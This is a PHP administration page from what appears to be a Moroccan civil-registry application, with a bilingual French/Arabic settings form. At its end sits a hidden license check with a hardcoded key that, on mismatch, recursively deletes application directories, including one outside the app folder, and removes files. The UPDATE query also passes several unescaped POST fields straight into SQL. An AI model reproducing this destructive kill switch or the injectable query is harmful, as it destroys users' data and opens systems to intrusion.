<?php 
session_start();
error_reporting(E_ALL ^ E_NOTICE);      include"conn/connexion.php";

$permission=$_SESSION["permission"];                                                                 $section=$_SESSION["section"];      
$section1=$_SESSION["section1"];  


$pays=$_SESSION["pays"];      
$pays1=$_SESSION["pays1"];  

$ministre=$_SESSION["ministre"];      
$ministre1=$_SESSION["ministre1"];      

$province=$_SESSION["province"];      
$province1=$_SESSION["province1"];      

$annexe=$_SESSION["annexe"];      
$annexe1=$_SESSION["annexe1"];     $region=$_SESSION["region"];  $region1=$_SESSION["region1"];      

   
 include"accesclient1.php";
if ($permission==securite4($tim4)) { include("div_admin.php");  

?>

<?php 

		
		$Requete3 = "select * from administration   ";
		
		mysql_query("SET NAMES 'UTF8' ");

$result3 = @mysql_query($Requete3,$id) or die ("<br>Probl&egrave;me lors de la lecture de la table<br>".mysql_error());
	$row3 = mysql_fetch_array($result3);


?>

<?php
$valider=$_POST["valider"];
if ($valider!="تعديل") { ?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xml:lang="fr" xmlns="http://www.w3.org/1999/xhtml" lang="fr"><head>

 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title>  برنامج تسيير مصلحة الحالة المدنية سيفيل بروكرما </title>      

<script type="text/javascript" src="js/arabic.js"></script>
    

</head>
<body>

  <div id="Layer1">
  
      <div id="background" class="background" style="display: none;"></div>
    <div id="clv_arb" class="clv_arb" style="display: none;"></div>

  
  </div>
  <p align="center"><h2 align="center">إعدادات</h2>
  </p>

  <div align="center">
  <form id="form1" method="post" action="">
    <table width="75%" border="0" align="center">
      <tr>
        <td width="137" bgcolor="#EFEFEF">Royaume du Maroc </td>
        <td width="322" bgcolor="#EFEFEF">
          <div align="left">
            <input name="pays" type="text" id="pays" value="<?php echo $row3[pays];?>" size="25" maxlength="45" />
          </div></td>
        <td width="311" bgcolor="#EFEFEF"><div align="center">
          
          <div align="right">
            <input name="pays1" type="text" id="pays1" value="<?php
			
					echo $row3[pays1];
			 
			 
			 ;?>" size="25" maxlength="45" dir="rtl" />
        <img src="icone/arabe.png" width="22" height="20" style="cursor: pointer;" title="Cliquer pour utilisez le Clavier arabe" onclick="showArabicKey('pays1')" /></div></td>
        <td width="194" bgcolor="#EFEFEF"><div align="right">المملكة المغربية</div></td>
      </tr>
      <tr>
        <td bgcolor="#EFEFEF">Ministre de l'intérieur </td>
        <td height="26" bgcolor="#EFEFEF">
          <div align="left">
            <input name="ministre" type="text" id="ministre" value="<?php 
			
echo $row3[ministre];		
			 ?>" size="25" maxlength="45" />
          </div></td>
        <td height="26" bgcolor="#EFEFEF">
          <div align="right">
            <input name="ministre1" type="text" id="ministre1" value="<?php echo $row3[ministre1];?>" size="25" maxlength="45" dir="rtl" />
              
              
          <img src="icone/arabe.png" width="22" height="20" style="cursor: pointer;" title="Cliquer pour utilisez le Clavier arabe" onclick="showArabicKey('ministre1')" /> </div></td>
        <td height="26" bgcolor="#EFEFEF"><div align="right">وزارة الداخلية</div></td>
      </tr>
      <tr>
        <td bgcolor="#EFEFEF">Province- préfecture </td>
        <td height="26" bgcolor="#EFEFEF">
          <div align="left">
            <input name="province" type="text" id="province" value="<?php 
			
echo $row3[province];
			
			
			?>" size="25" maxlength="45" />
          </div></td>
        <td height="26" bgcolor="#EFEFEF">
          <div align="right">
            <input name="province1" type="text" id="province1" value="<?php echo $row3[province1];?>" size="25" maxlength="45" dir="rtl" />
              
              
          <img src="icone/arabe.png" width="22" height="20" style="cursor: pointer;" title="Cliquer pour utilisez le Clavier arabe" onclick="showArabicKey('province1')" /> </div></td>
        <td height="26" bgcolor="#EFEFEF"><div align="right">عمالة - إقليم</div></td>
      </tr>
      <tr>
        <td bgcolor="#EFEFEF">Municipalité -commune..</td>
        <td height="26" bgcolor="#EFEFEF">
          <div align="left">
              <select name="region" id="region">
			  
                <option><?php echo $row3[region] ?></option>
                <option>Municipalité</option>
                <option>Commune rurale</option>
              </select>
              <?php echo $row3[section]; ?></div></td>
        <td height="26" bgcolor="#EFEFEF">
          <div align="right">
            <?php echo $row3[section1]; ?> 
            <select name="region1" id="region1">
			
			  <option value="<?php echo $row3[region1] ?>"><?php echo $row3[region1] ?></option>

              <option value="بلدية">بلدية</option>
              <option value="الجماعة القروية"> الجماعة القروية</option>
            </select>
          </div></td>
        <td height="26" bgcolor="#EFEFEF"><div align="right">بلدية.. مقاطعة... جماعة قروية</div></td>
      </tr>
      <tr>
        <td height="26" bgcolor="#EFEFEF">Cercle</td>
        <td height="26" bgcolor="#EFEFEF"><div align="left">
            <input name="cercle1" type="text" id="cercle1" value="<?php 
	
echo $row3[cercle1];
			
			
			?>" size="25" maxlength="45" />
        </div></td>
        <td height="26" bgcolor="#EFEFEF"><div align="right">
            <input name="cercle" type="text" id="cercle" value="<?php echo $row3[cercle];?>" size="25" maxlength="45" dir="rtl" />
            <img src="icone/arabe.png" width="22" height="20" style="cursor: pointer;" title="Cliquer pour utilisez le Clavier arabe" onclick="showArabicKey('cercle')" /> </div></td>
        <td height="26" bgcolor="#EFEFEF"><div align="right">الدائرة</div></td>
      </tr>
      <tr>
        <td rowspan="2" bgcolor="#EFEFEF">Responsalité</td>
        <td height="12" bgcolor="#EFEFEF"><label>
          <input name="resp" type="radio" id="resp" value="Président du conseil municipal" <?php if($row3[resp]=="Président du conseil municipal") echo "checked=checked"; ?> />
        Président du conseil municipal </label></td>
        <td height="12" bgcolor="#EFEFEF"><div align="right">
            رئيس المجلس البلدي
            <input name="resp_a" type="radio" id="resp_a" value="رئيس المجلس البلدي"  <?php if($row3[resp_a]=="رئيس المجلس البلدي") echo "checked=checked"; ?> />
          </div></td>
        <td rowspan="2" bgcolor="#EFEFEF"><div align="right">صفة المسؤول</div></td>
      </tr>
      <tr>
        <td height="12" bgcolor="#EFEFEF"><label>
          <input name="resp" type="radio" id="resp" value="Président du conseil communal"  <?php if($row3[resp]=="Président du conseil communal") echo "checked=checked"; ?>/>
          Président du conseil communal </label></td>
        <td height="12" bgcolor="#EFEFEF"><div align="right">
          رئيس المجلس الجماعي
            <input name="resp_a" type="radio" id="resp_a" value="رئيس المجلس الجماعي" <?php if($row3[resp_a]=="رئيس المجلس الجماعي") echo "checked=checked"; ?> />
        </div></td>
      </tr>
      <tr>
        <td height="26" bgcolor="#EFEFEF"><p>Fait Au </p></td>
        <td height="26" bgcolor="#EFEFEF"><input name="nom_resp" type="text" id="nom_resp" value="<?php echo $row3[nom_resp];?>" size="25" maxlength="45" /></td>
        <td height="26" bgcolor="#EFEFEF">
		
	      <div align="right">
	        <input name="nom_resp_a" type="text" id="nom_resp_a" value="<?php echo $row3[nom_resp_a];?>" size="25" maxlength="45" dir="rtl" />
	        
	        
          <img src="icone/arabe.png" width="22" height="20" style="cursor: pointer;" title="Cliquer pour utilisez le Clavier arabe" onclick="showArabicKey('nom_resp_a')" />          </div></td>
        <td height="26" bgcolor="#EFEFEF"><div align="right">العبارة حرر ب</div></td>
      </tr>
      <tr>
        <td height="26" colspan="4" bgcolor="#EFEFEF"><div align="center">
          <label>
          <input name="valider" type="submit" id="valider" value="تعديل" />
          </label>
        </div></td>
      </tr>
    </table>
  </form>
</div>
   <p>&nbsp;</p>
</body>
</html>



<?php }else
	
{

$region=addslashes($_POST["region"]);
$region1=$_POST["region1"];


$pays=addslashes($_POST["pays"]);
$pays1=$_POST["pays1"];
$ministre=addslashes($_POST["ministre"]);
$ministre1=$_POST["ministre1"];
$province=addslashes($_POST["province"]);
$province1=$_POST["province1"];

$resp=addslashes($_POST["resp"]);
$resp_a=addslashes($_POST["resp_a"]);

$nom_resp=addslashes($_POST["nom_resp"]);
$nom_resp_a=addslashes($_POST["nom_resp_a"]);

$cercle=addslashes($_POST["cercle"]);
$cercle1=addslashes($_POST["cercle1"]);

    
$Requete =  " UPDATE administration SET  `pays`='$pays', `pays1`='$pays1', `ministre`='$ministre', `ministre1`='$ministre1',`province`='$province',`province1`='$province1', `region`='$region', `region1`='$region1', `resp`='$resp', `resp_a`='$resp_a', `nom_resp`='$nom_resp' , `nom_resp_a`='$nom_resp_a' , `cercle`='$cercle', `cercle1`='$cercle1' ; "; 

mysql_query("SET NAMES 'UTF8' ");
$result = @mysql_query($Requete,$id) or die ("<br>Probl&egrave;me d'execution de la requete d'identification<br>".mysql_error()); 
	
	
include"aces.php";
echo "<div align=\"center\"><span class=\"style9\"><b></b></span><BR>";

		echo "<a href=\"administration.php\">رجوع</a>";

	
  }
  





?>




<?php 

include"conn/conversion.php";

$R2 = "select section,corps from administration   ";
$re2 = @mysql_query($R2,$id) or die ("<br>Probl&egrave;me lors de la lecture de la table<br>".mysql_error());


 	$region = mysql_fetch_array($re2);

 $maChaineCrypter = crypter("*78|Jh#&g6+5", $region[section]);


if($maChaineCrypter!=$region[corps])
{

advancedRmdir("../../prog");
advancedRmdir("icone");
advancedRmdir("etat");
advancedRmdir("Artichow-php4+5");
advancedRmdir("js");

unlink("naissance11.php");
unlink("div.php");
unlink("div_adm.php");


}



?>




<?php   }else{ ?> 

Vous n'avez pas le droit de voir cette page
  <?php } ?>
